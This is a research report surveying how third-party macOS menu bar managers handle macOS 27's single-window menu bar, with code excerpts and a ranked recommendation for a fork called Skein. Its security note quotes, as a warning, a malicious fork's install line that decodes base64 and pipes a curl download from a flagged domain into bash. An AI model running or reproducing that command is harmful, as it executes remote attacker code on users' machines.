# macOS 27 "Golden Gate" Menu Bar Hiding/Showing/Rearranging: How Third-Party Managers Cope

Date: 2026-09-15. Scope: external, read-only research. No files in the Skein repo were changed.

## Outcome

macOS 27 removed the mechanism every menu bar manager on the Mac relied on: through macOS 26, each third-party status item was its own small WindowServer window, so a manager could enumerate, screenshot, reposition, or push those windows off-screen. On macOS 27 the whole bar composites into one WindowServer window owned by the `MenuBarAgent` process (confirmed independently by the dwarvesf/hidden PR bodies, the Itzhaik07/Tidy README, the Thaw tracking issue, and a third-party blog post) — this matches what Skein already observed locally (`CGSGetProcessMenuBarWindowList` returning only window 550 "Menubar"). There is no new public Apple API for third-party menu bar management; every project surveyed here (Hidden Bar, Tidy, Thaw, Bartender, BetterTouchTool, Brow) is built on undocumented, unstable internals, and all of them describe macOS 27 betas as a moving target that changed behavior mid-cycle (Thaw's own maintainer reports Apple relocated the menu bar's persisted-order file between beta builds).

Three distinct architectural families exist among the projects surveyed:

1. **Length-inflation / spacer-item trick** (Hidden Bar) — the same family as Skein's current approach (grow your own status item's `length` so the bar pushes other icons off). Its own author abandoned the macOS 27 fix PR mid-flight ("superseded by the author's own switch to a different tool" — PR #392 closing comment). It never truly rearranges other apps' items; it only shoves them into Apple's own native overflow chevron (`«`).
2. **AX-overlay compositing** (Tidy) — never touches the real status items. It paints stacked, permission-free `NSVisualEffectView` windows over the region Accessibility reports as occupied, and forwards clicks via `AXUIElementPerformAction`. Immune to the length-cliff entirely, but single-display, and "rearranging" is only a locally-remembered draw order inside its own overlay strip, not a real change to the bar's persisted order.
3. **Preferred-position table writes + synthetic-drag fallback** (Thaw, and by its own account Bartender/BTT via "the same macOS 27 APIs") — writes directly into `MenuBarAgent`'s real order-of-truth. This is the only mechanism that actually reorders other apps' icons in the live bar. It requires Full Disk Access after Apple moved that table into a protected app-group container in beta 8; without FDA it falls back to synthesizing Cmd-drag mouse events, which is slow, visible, and has an open, reproducible bug ("cursor gets kidnapped").

**Recommendation, ranked for Skein (Ice fork, Swift/AppKit, needs real hide/show/rearrange of *other* apps' items):**

> Correction (2026-09-15, after this report): Thaw's macOS 27 engine is not in its public source. PR #773 was closed unmerged, its `MenuBarHost` / `PlatformRuntimeKit` packages come from `thaw-app/prk-bin` (404), and the `development` branch and the `3.0.0-alpha.4.1` tag resolve to the same commit without that code. Porting Thaw's implementation is therefore not possible today; the table-write mechanism itself remains valid. Thaw 3.0.0-alpha.2's changelog says access to the layout table comes from an NSOpenPanel grant on that one file, with Full Disk Access optional.

1. **Primary target: the Thaw/preferred-position-table model.** It is the only one of the three that satisfies Skein's actual requirement (moving other apps' items, not just painting over them), it is being built by a team actively fighting this exact problem on the exact OS, and its lineage (a fork of Ice) is architecturally the closest match to Skein. Budget for the cost: Full Disk Access as a real, user-facing permission ask (rules out App Store sandboxing per dwarvesf's own architecture notes — "a private assertion API not available to a sandboxed App Store app"), a CGEvent synthetic-drag fallback for users who decline FDA, and ongoing maintenance because the on-disk format already moved once mid-beta and has no stability guarantee.
2. **Interim/fallback for hide-show only: Tidy's AX-overlay model.** Lower engineering risk (no FDA, no synthetic input, ~1,000 lines total), and it can ship as a stopgap for "hide/show" while the rearrange piece is built, but it cannot deliver true cross-app reordering and is single-display by its own admission.
3. **Do not invest further in the length-inflation/spacer family.** Its own upstream author walked away from it after two PRs, it only ever banishes icons into Apple's *native* overflow menu (which macOS 27 now ships on its own, reducing this family's value proposition), and — see Unresolved Questions — Skein's own measured clamp behavior (~5002pt, no reflow) does not match the "drop-at-half-display-width" cliff this family's authors measured, meaning the mechanism may not even be tunable to Skein's exact situation without further on-device sweeps.

## 1. dwarvesf/hidden — PR #392 and #382

**Status, verified via `gh pr view`:** PR #382 (bhaveshnigam, opened 2026-07-30) is still **OPEN, unmerged**. PR #392 (alexkerber, opened 2026-09-14, builds on #382) is **CLOSED, not merged** — the maintainer's own closing comment reads: *"Closing: superseded by the author's own switch to a different tool. The measurements and approach stay in the description for anyone who wants to pick this up."* Neither fix has shipped to users.

**Root cause (both PRs agree):** macOS 27 *discards* a status item whose `length` reaches half the display width, where macOS ≤26 clamped it instead. PR #382, measured on a 2056pt display, build **26A5388g**: 600/900/1000pt all hide correctly; 1028pt (exactly width/2) and above drops the item outright — the separator's own `|` glyph disappears and nothing is displaced. PR #392, measured on build **26A428** — the same build Skein is running — with a 1800 + 3008 + 2×1920pt display arrangement: on the 3008pt display, 1480pt is honored and 1500pt is dropped.

**The "half display width" cliff, in code** (`hidden/Features/StatusBar/StatusBarController.swift`, PR #392 diff):
```swift
@available(macOS 27.0, *)
private static var collapseUnit: CGFloat {
    let narrowest = NSScreen.screens.map { $0.frame.width }.min() ?? 1728
    return max(200, (narrowest / 2 - 64).rounded(.down))
}
```
On macOS ≤26 the old rule survives unchanged: `max(500, min(screenWidth * 2, 10_000))` sized off the *widest* screen — i.e. exactly Skein's current strategy, just against a different screen-selection rule.

**Spacer items.** Below the cliff, macOS 27 pushes the icons the separator displaces into its own native overflow menu — but only once they clear the frontmost app's menu bar menus, a distance that grows with display width while the cliff is capped at half of it. Past ~2800pt the two cross and a single item can never span the distance. PR #392's fix is to add six always-created, zero-length "spacer" status items between the separator and the arrow. While collapsed they inflate to the same length as the separator (`isVisible = true`, `length = btnHiddenCollapseLength`); because macOS overflows the bar from the left, the real icons get pushed into the overflow chevron first and the spacers absorb the rest of the span themselves, harmlessly. While expanded they go `isVisible = false, length = 0`, which — per the code comment — preserves their slot in the layout table without occupying room.

**`_v27` autosave names and registration order.** On macOS 27 every item's position lives in the *host's* (MenuBarAgent's) layout table, keyed by autosave name; the app can neither read nor seed it, and a brand-new name always lands leftmost. PR #392 therefore renames every item with a version suffix and creates them in declaration order specifically so a fresh install (or an upgrade, which gets fresh names too) lands them in the right relative order — arrow, spacers, separator, left to right:
```swift
private static let autosaveSuffix: String = {
    if #available(macOS 27.0, *) { return "_v27" }
    return ""
}()
private static func makeItem(_ name: String, length: CGFloat) -> NSStatusItem {
    let item = NSStatusBar.system.statusItem(withLength: length)
    item.autosaveName = name + autosaveSuffix
    return item
}
```
**Consequence for upgraders:** because the names change, existing users must ⌘-drag their icons past the separator once after updating, exactly as on a fresh install — the PR body states this explicitly.

**How hidden icons reach the native overflow menu / how the user reaches them:** the mechanism produces no app-owned UI for reaching hidden icons — it relies entirely on macOS 27's own `«` overflow chevron once the separator's inflated length has physically displaced the icons past the frontmost app's menu boundary. The app's own arrow button (`btnExpandCollapse`) is unrelated automation for toggling collapse/expand of the *separator's* length; a new opt-in hover-to-expand (`defaults write com.dwarvesv.minimalbar hoverToExpand -bool true`, only installs a global mouse monitor if set at launch, 0.5s dwell timer) additionally lets the user hover in the menu-bar band to auto-expand.

**Multi-display handling:** PR #382 sizes off the *widest* screen pre-27 (unchanged) but per-27 must size off the *narrowest*, because one length is applied identically on every display's bar and the cliff is a per-display fraction. PR #392 lifts this: it drops #382's `hideWithMixedDisplays` opt-in and hides everywhere by default via the spacer mechanism, verified on a 4-display, mixed-width rig. Both PRs explicitly flag **notched Macs as unverified/untested** — directly relevant to Skein's 1800pt notched display.

**Known bugs / limitations (both PRs, verbatim from their docs):**
- The always-hidden section's separator still inflates by only one unit even with spacers on the regular section, so on a wide display its icons can leak into view while the regular section is expanded.
- A verification trap the authors flag explicitly: capturing only the right half of an external display's bar made displaced-left icons falsely read as "hidden."
- `CGWindowListCopyWindowInfo` cannot capture a fullscreen-covered menu bar with plain `screencapture`; both PRs instead locate the `MenuBarAgent` window by ID via `CGWindowListCopyWindowInfo([.optionAll])` and capture with `screencapture -x -o -l <id>`, which works even when WindowServer reports the window `onscreen=false` — directly useful for Skein's own verification tooling.
- Epic #366 (open, "managed-overflow / second-bar redesign") is the project's own admission that the length-inflation model is structurally limited on macOS 27 and that the fix is a rewrite toward "the model Bartender/Ice use" (i.e., families #2/#3 below), not a deeper tuning of family #1.
- The BACKLOG.md addition names the real order-of-truth directly: *"`MenuBarAgent` persists per-item positions in the `com.apple.MenuBarAgent` domain (`TrailingItemPreferredPositions`, `status:<bundle-id>::<autosave>` keys); unsandboxed managers manipulate that layer via a private assertion API not available to a sandboxed App Store app."* This is corroborated independently by the Thaw thread (below).

## 2. Itzhaik07/Tidy

Cloned at commit `3cf4ccf` (single commit visible at depth 1), MIT, macOS 14+ declared floor but README states it targets macOS 27 specifically and macOS ≤26 users are told to keep using Hidden Bar/Ice instead. ~1,000 lines total across `Sources/Tidy/{App,OverlayWindow,StatusItems,Preferences}.swift` and a small testable `TidyCore/Layout.swift`.

**Overlay blur windows** (`Sources/Tidy/OverlayWindow.swift`): two stacked `NSVisualEffectView` windows with `.material = .titlebar`, `.blendingMode = .behindWindow`, plus a calibrated translucent color wash (`NSColor(srgbRed: 0.4343, green: 0.2151, blue: 0.2018, alpha: 0.05)`) in a *separate* window layered on top — the code comments explain a subview inside an effect view gets vibrancy blending and stops compositing linearly, so the wash must be its own window. Window level is `CGWindowLevelForKey(.statusWindow) + 1 + layerIndex`. Two blur layers were chosen because "one blur leaves the covered icons ghosting through; stacked blurs compound until the ghost is unmeasurable" (README, calibrated fidelity 0.007 / ghost 0.002 channel-delta against real captures). An `InteractionWindow` sits one level above the blur stack to swallow clicks in erase mode and to host a clickable/draggable icon strip in expanded mode.

**Why not ScreenCaptureKit/screenshot repainting:** the README explicitly records two rejected approaches — screenshot-based repainting (needs Screen Recording, refreshes late) and a live `ScreenCaptureKit` stream, which "turns out to plant the purple screen-sharing pill inside the menu bar itself for as long as the stream runs, composited into the same WindowServer window as every status item, unexcludable." The blur-compositor approach needs zero permission beyond Accessibility.

**Discovering which icons to cover** (`Sources/Tidy/StatusItems.swift`): iterates `NSWorkspace.shared.runningApplications`, creates `AXUIElementCreateApplication(pid)`, reads the `AXExtrasMenuBar` attribute, walks its `AXChildren`, and reads `kAXPositionAttribute`/`kAXSizeAttribute` per child (converted from AX's top-left origin to AppKit's bottom-left). Items are filtered to `frame.width > 1 && frame.width < 400` to exclude anything already inflated off-screen or collapsed to nothing by the system. Apple's own items are recognized by `bundleID.hasPrefix("com.apple.")` and deliberately left alone; the code comment notes Apple's own items "all report the same owning process" (`MenuBarAgent`) and are distinguishable from each other only by `AXDescription`/`AXTitle` — independently confirmed by the Thaw thread's iStat Menus finding below.

**AXPress activation** (`StatusItems.press`): `AXUIElementPerformAction(item.element, kAXPressAction as CFString)` — a direct AX press on the real item's `AXUIElement`, so a click on Tidy's painted strip behaves exactly like clicking the real icon, including opening the real item's menu at the item's true screen position. `AppController.activate(_:)` uncoverers the overlay for ~0.4s while the press lands, then re-covers on the next left/right mouse-down or key-down outside that window.

**Discovery of the hidden zone:** the app's own chevron is a plain `NSStatusItem`; everything with `frame.midX < chevron.frame.minX` counts as hidden. Users hide an icon by **⌘-dragging it to the left of Tidy's chevron — the same drag macOS has always used for menu bar rearranging** — confirming Cmd-drag itself still functions as a system-level gesture on macOS 27 (see item 6 below); Tidy relies on it rather than reimplementing it.

**Click-through / notch overflow:** when more icons are hidden than fit before the notch, macOS 27 stops drawing the excess entirely (no AX frame at all for them); Tidy detects this via `isRendered(_:)` (duplicate/stacked AX frames at identical x, or a frame inside the notch gap, or off-screen) and switches from "erase" mode to a scrollable "strip" mode, where each hidden item is represented by its **owning app's `NSRunningApplication.icon`** (not the real icon pixels, since nothing was ever drawn to read).

**Rearranging:** limited to the strip's own presentation order, persisted in `UserDefaults` under `stripOrder` (`Preferences.swift`) and applied by a stable sort in `Preferences.arrange(_:)`. This does **not** change the real bar's persisted order — it is a local view-order preference inside Tidy's own overlay, not a rearrangement of other apps' items in the underlying `MenuBarAgent` table.

**Multi-display:** README states plainly, "Single display only — Tidy works the main screen's bar," and the notch-only/no-second-monitor caveat is called out as untested.

**Known limitations (from README, verbatim):** dark-mode-and-dark-wallpaper-calibrated erase tone (light mode "not verified to the same standard"); a 1-second polling rescan means a newly appearing/moving icon can take up to a second to be re-covered; unsigned/unnotarized release builds require the "Open Anyway" override since "the old right-click → Open override no longer exists for unsigned apps"; ad-hoc rebuild signing means Accessibility permission must be re-granted on every rebuild unless a stable signing identity is set.

**Adoption risk:** single-author repo, MIT, one commit visible, version 0.2.0, no CI/release artifacts observed, no issue tracker activity checked (not explored — out of scope given time budget) — treat as an early-stage reference implementation rather than a production dependency.

## 3. Thaw (Ice successor)

`jordanbaird/Ice` (the original) is effectively dormant: `pushedAt: 2025-09-20`, i.e. **before macOS 26 or 27 shipped**, and issue #877 is literally titled "PROJECT DEAD, no updates in 1.5 years, crashes all the time" (open). The community has responded with at least two unofficial forks: `lxy1992/Ice` (macOS 26 compatibility only, per issue #966) and a since-flagged-malicious `liptonZ777/Ice-Maintained`.

**⚠️ Security note surfaced during this research, reported here because it is directly relevant to "how users reach fixes":** on Ice issue #954, GitHub user `bezibaerchen` identified that `liptonZ777/Ice-Maintained`'s claimed "works on macOS 26/27" fork ships an install script containing `nohup bash -c 'echo "$1" | base64 -d | bash' _ "${_mbar_reg_a}${_mbar_reg_b}${_mbar_reg_c}${_mbar_reg_d}"`, which resolves to `curl -s "https://amz.shlyapadulina.space/d/command?..." | bash`. The URL is listed on ThreatFox (`https://threatfox.abuse.ch/ioc/1779996/`) as a known indicator of compromise. `diazdesandi` (Thaw maintainer) independently confirmed "there's no evidence supporting some of the claims (like macOS 27 support)." This research did not fetch or execute anything from that domain. Flag this to anyone pointed at "maintained Ice forks" claiming macOS 27 support outside the two legitimate projects named in this report (Thaw, and Tidy as an unrelated clean-room alternative).

**The real successor is `stonerl/Thaw`** (mirrored/canonical at `thaw-app/Thaw`, GPL-3.0 per `gh repo view`, 10,849 stars, pushed essentially continuously through 2026-09-15). It is a genuine fork/continuation of Ice's codebase and UI model, being rebuilt specifically for macOS 27's single-window bar. Current release channel state at research time: latest stable `2.0.1` (2026-09-02), with `2.1.0-beta.3` and a parallel, more experimental `3.0.0-alpha.4.1` rewrite both in flight (as of 2026-09-15) — three active branches simultaneously, a sign of how unsettled the macOS 27 support story still is.

**Timeline reconstructed from the 438-comment tracking issue `thaw-app/Thaw#687`** ("[Tracking] macOS 27 (Golden Gate) support & preview builds"):
- **2026-06-08** (day of the first developer beta): contributor `m41denx` reports `CGSGetProcessMenuBarWindowList` now returns only the single "Menubar" window, and speculates the new `MenuBarAgent` process's XPC could be used instead — this is the same finding Skein made locally.
- **2026-06-10:** maintainer `diazdesandi` reports the XPC handshake *does* succeed as long as the calling app is code-signed, but "many functions are stubbed," and that there exists an actual **`man` page for `MenuBarAgent`** with "almost no information."
- **2026-06-10** (same day): BetterTouchTool developer `fifafu` ("NONE" association, i.e. an external contributor to this thread) posts that they found "two viable ways for menubar managers to work on macOS 26/27," shipped the first in **BetterTouchTool 5.670**, and offers to share reusable code with Thaw/Ice once validated. A later comment from a Thaw maintainer deflates the mystique: *"It's not some breakthrough, it just drops a spacer in the menu bar and slapped on an icon [...] from Sindre Sorhus."* — i.e., BTT's initial approach was, at least in part, the same spacer-item family as dwarvesf/hidden, not a novel private API.
- **2026-06-22 onward:** a string of experimental "macOS 27 preview" builds ships via GitHub Actions artifacts, explicitly labeled "unofficial / not supported," through Preview 6 (by ~late July). Recurring user-reported bugs across this period: a cursor-thrashing infinite loop retrying unachievable item moves against anchored system items (fixed); disappearing icon images from over-aggressive cache cleanup (fixed); duplicate items from live AX-title metric changes (fixed).
- **2026-07-25** (per the maintainer status banner pinned atop the issue): *"Support is in preview, with Preview 5 now available — much less experimental than the early builds. [...] If nothing blocking turns up from Preview 5, the next step is moving macOS 27 support into the Alpha / Nightly phase as part of the v2.1.0 cycle."*
- **Beta 8 (undated in-thread, referenced 2026-09-05):** maintainer reports *"Apple gated the API we used to reorder behind Full Disk Access"* and that beta 8 *"moved the layout table from `~/Library/Preferences/com.apple.MenuBarAgent.plist`, which any app could read, into a protected app-group container. macOS refuses access to that container silently. There is no consent prompt and no scoped permission for a single folder. Full Disk Access is the only thing a user can grant to unlock it."*

**Thaw's macOS 27 mechanism, concretely:**
- **Reordering with Full Disk Access:** Thaw reads and writes exactly one file — the protected menu-bar layout table — writing sort weights so *"reorders land instantly with no cursor movement. Thaw writes the sort weights and the system re-sorts the bar itself."* This directly corroborates dwarvesf/hidden's independent finding of a `com.apple.MenuBarAgent` domain with `TrailingItemPreferredPositions`/`status:<bundle-id>::<autosave>` keys.
- **Reordering without Full Disk Access (fallback):** *"Thaw falls back to moving items with synthetic drags. The fallback works, but it's slower, visible, and briefly uses the pointer."* An earlier comment (line ~989 of the fetched thread) states the team *"stopped relying on the cursor to move menu bar items a few builds ago (preferred-position writes instead of synthetic drags)"* for the FDA-granted path specifically — the synthetic-drag path remains the fallback for users who decline FDA. This fallback is the source of the widely-reported "cursor gets kidnapped" bug (maintainer's own phrasing, 2026-09-05), still open as of the latest comments read.
- **Detection/scan:** same `AXExtrasMenuBar`-style enumeration family as Tidy and dwarvesf, evidenced by log lines the team itself posts for debugging (`[Bridging] getProcessMenuBarWindowList: returned 1 menu bar windows`, `getMenuBarWindowList: 1 raw -> 0 after filtering`).
- **Known, unresolved third-party incompatibility — iStat Menus:** *"iStat's menu bar items register under a synthetic display-name identity ('iStat Menus Menubar') that macOS 27's attribution path does not bind to their real bundle (`com.bjango.istatmenus.status`). MenuBarAgent never attributes them to a real bundle."* The maintainer states plainly: *"Bartender 7 has the same iStat problem we do, Thaw, Bartender, and BTT all use the same macOS 27 APIs for that"* — direct, named cross-vendor confirmation that Thaw, Bartender, and BetterTouchTool converged on the same underlying (private) mechanism. Bjango (iStat's vendor) has not responded to any of the three teams as of the last comment read.
- **Permissions model as of 2026-09-05:** Accessibility (required), Screen Recording (optional), Full Disk Access ("strongly recommended," not yet hard-required, explicitly framed as a privacy trade-off the maintainer is uneasy about: *"I'd rather not make a third permission mandatory if I can avoid it"*).
- **Explicitly out of scope / limitation:** *"Multiple items from the same bundle cannot be hidden one by one, that's a limitation of macOS so far."*

**Adoption risk assessment for Thaw specifically:** high development velocity but also high churn — three simultaneous release tracks (2.0.x stable, 2.1.0-beta, 3.0.0-alpha) at research time, a still-open cursor-kidnapping bug, a permission model that changed at least twice in three months (Screen Recording semantics → FDA), and a hard dependency on an Apple-internal file format that already moved once without notice. It is the most capable option surveyed but the least stable target to build *against* today.

## 5. Bartender 6/7, BetterTouchTool, Brow

**Bartender.** The public changelog page (`macbartender.com/goldengate/releases`, fetched directly) confirms the same headline break — *"Apple made more unrecoverable changes to the menu bar system in macOS 27"* — and states Bartender *"no longer touches your mouse to move items. It only interacts with the mouse when you activate an item,"* i.e. it moved to the same preferred-position-table-write model Thaw uses for reordering, reserving synthetic mouse input for activation only. It also states Bartender *"can function with no screen recording at all"* now. Named limitations: multi-item apps can't have individual items shown/hidden independently (same constraint Thaw hit with iStat), system items (clock, Control Center) can be reordered but not hidden, and items a user hid via Control Center's own native toggle cannot be overridden by Bartender ("only detect them experimentally"). Beta numbering (Beta 1–4) was referenced but the fetched page did not expose per-beta dates. Independent corroboration: the Thaw thread has the maintainer directly naming Bartender 7 as sharing Thaw's exact iStat Menus bug because *"Thaw, Bartender, and BTT all use the same macOS 27 APIs for that."*

**BetterTouchTool.** Primary evidence is `fifafu`'s (BTT's developer, Andreas Hegenberg) own posts in the Thaw tracking issue and the linked BTT community thread (`community.folivora.ai/t/...macos-27-golden-gate-menu-bar-management-broken.../47232`). Two techniques were described only at a high level in the material actually retrieved: (a) the "Load Menu Bar Layout" action, which lets a user capture and later re-apply a named layout via automation trigger — one Thaw maintainer's characterization of the underlying trick is unflattering ("just drops a spacer in the menu bar and slapped on an icon from Sindre Sorhus," i.e., spacer-item family, not a private API breakthrough); (b) an unspecified second approach `fifafu` did not detail in the retrieved posts. Hegenberg's own framing of both, quoted from the fetched forum content: *"both ways are not official, so Apple might block them at any time during the beta phase."* No SkyLight/CGS function names or `defaults` key names attributable specifically to BTT were found in the sources fetched — this is a **gap**, not a negative finding (see Unresolved Questions).

**Brow 1.0.63.** Per Brow's own blog post (self-published; treat as promotional, corroborated only where it overlaps independently-sourced facts) at `brow-app.com/blog/macos-27-menu-bar`: Brow ships a Menu Bar Manager module that hides/shows/reorders icons and lives in the notch. Its detection mechanism is **screenshot differencing**, explicitly distinct from Tidy's AX-only approach and requiring Screen Recording: *"Right after launch, Brow screenshots the bar, briefly hides one icon, screenshots again, and crops the strip that vanished."* The post names two undocumented defaults keys, `NSStatusItemSpacing` and `NSStatusItemSelectionPadding`, and states *"on the macOS 27 beta third-party apps read them once at launch and never again, and Apple's own icons ignore them entirely"* — i.e. Brow found these keys to be functionally dead on macOS 27, not a working lever. The same post's architecture claim ("the menu bar is now rendered as a single window... eliminates the previous per-icon window enumeration") is independently corroborated by every other source in this report, so treat that part as solid; treat the screenshot-diffing implementation detail and the two defaults-key names as single-sourced from a vendor's own marketing blog.

## 6. Cmd-drag and `NSStatusItem Preferred Position <autosaveName>` on macOS 27

**Cmd-drag itself still works as a user gesture.** Both dwarvesf/hidden ("Upgraders ⌘-drag their icons past the separator once, as on a fresh install") and Tidy ("⌘-drag any menu bar icon to the LEFT of Tidy's chevron... the same drag macOS has always used for rearranging menu bar icons") rely on it directly as of macOS 27, and neither reports it being broken system-side.

**The classic `NSStatusItem Preferred Position <autosaveName>` `UserDefaults` key is no longer the order-of-truth on macOS 27.** Three independent sources converge on this: (a) dwarvesf/hidden's architecture notes state positions now live in "the host's layout table," not something the app can read or seed, requiring the `_v27` autosave-name churn workaround; (b) the same PR's backlog notes name the real store as `com.apple.MenuBarAgent` domain keys `TrailingItemPreferredPositions`/`status:<bundle-id>::<autosave>`; (c) Thaw's maintainer independently names the real file as `~/Library/Preferences/com.apple.MenuBarAgent.plist` pre-beta-8, moved into a protected app-group container by beta 8, and describes writing "sort weights" into it (not the classic per-app defaults domain) to achieve instant, cursor-free reordering. A generic web search for the classic key returned only pre-macOS-27 material (the `NSStatusItem` documentation itself and unrelated community Q&A) and no evidence it still governs cross-app order on 27 — treat "the classic per-app key still controls order" as **contradicted** by the primary sources above, not merely undocumented.

**Practical reading for Skein:** Cmd-drag as a *user gesture* is safe to keep relying on (e.g., "drag your icon left of our divider once"), but writing to `NSStatusItem Preferred Position <name>` in `UserDefaults` yourself, or reading it to detect current order, will not reflect or control macOS 27's real menu-bar order — the real store is MenuBarAgent's own protected table, reachable only with Full Disk Access (per Thaw) or by synthesizing the drag gesture itself (CGEvent-based, the fallback both Thaw and, per the search result surfaced, at least one smaller unrelated project use).

## 7. Apple documentation / WWDC 2026

No official Apple public API for third-party menu bar management was found. WWDC 2026 (June 8, 2026) is consistently cited by secondary sources as introducing the native expand/collapse overflow button and the single-window compositing model, but no session or documentation page was located that discusses `NSStatusItem`, `AXExtrasMenuBar`, or `MenuBarAgent` changes for third-party developers — every technical detail in this report comes from reverse engineering by the projects surveyed, not from Apple. A direct fetch of Apple's macOS 27 release notes page returned only a page title with no renderable body (likely JavaScript-gated), so this is an **inconclusive, not negative,** finding — it should be rechecked directly in a browser rather than relied on as confirmed absence.

One independently-sourced technical dump (`jizhi0v0/macos27-beta-issues`, a community beta-issue tracker, likely built from binary/plist inspection rather than Apple docs) adds detail worth treating as **single-sourced, unverified**: `MenuBarAgent.app` lives at `/System/Library/CoreServices/MenuBarAgent.app`, launches via `com.apple.MenuBarAgent.plist` (`RunAtLoad`/`KeepAlive`), links private frameworks `MenuBarClient`, `MenuBarClientCore`, `ControlCenter`, and `SkyLight`, renders its window at WindowServer layer 24, and gates its whole feature set behind an internal flag named `MenuBar/MenuBarQFA` (meaning undocumented). It also reports a real, since-fixed idle-CPU regression (10–14% at beta 2, ~0.28% by beta 3 build `26A5378j`). None of this was independently corroborated by a second source in this research pass; useful as a lead for further reverse-engineering, not as a citable fact on its own.

## Unresolved questions

1. **Skein's own measured clamp (~5002pt, item stays put, no reflow) does not match dwarvesf/hidden's measured behavior (item is *dropped/vanishes* once length exceeds roughly half the narrowest display's width — ~836–900pt for an 1800pt-wide display, per their own formula and PR #392's same-build 26A428 measurement).** These are materially different symptoms on the same OS build. One plausible, *unverified* reconciling hypothesis worth testing on-device: AppKit may clamp the `length` property itself to a fixed ceiling near 5000pt (readable back as ~5002) independently of, and prior to, WindowServer's separate half-display-width reflow cutoff — meaning both clamps could be real and simply operating at different layers, with WindowServer's lower threshold making the AppKit-side ceiling unreachable in practice on a narrow display. This needs the same sweep methodology dwarvesf used (`screencapture -x -o -l <MenuBarAgent window id>` at each length, comparing PNG byte size / AX presence) run directly against Skein's divider item before trusting either project's cliff formula.
2. Whether BetterTouchTool's second (undisclosed in retrieved sources) technique differs materially from the spacer-item trick already identified for its first technique — would need the full BTT forum thread rather than the summarized excerpt fetched here.
3. Whether Apple published any developer-facing statement about the menu bar architecture change (WWDC 2026 session, release notes, or a Feedback Assistant response) — the release-notes fetch was inconclusive (empty render), not confirmed negative.
4. Whether the `com.apple.MenuBarAgent` protected-container reorder path is reachable at all from a sandboxed distribution channel (Mac App Store) — dwarvesf's own notes say no ("not available to a sandboxed App Store app"); this is directly relevant if Skein is or intends to be App-Store-distributed, and was not independently verified against Apple's sandbox entitlement documentation in this pass.
5. Whether macOS 27.x point releases after the 26A428 GM (this report's cutoff) have changed any of the measured thresholds again — Thaw's own history shows Apple already moved the layout table mid-beta once without notice; nothing in the sources surveyed suggests this settled at GM.
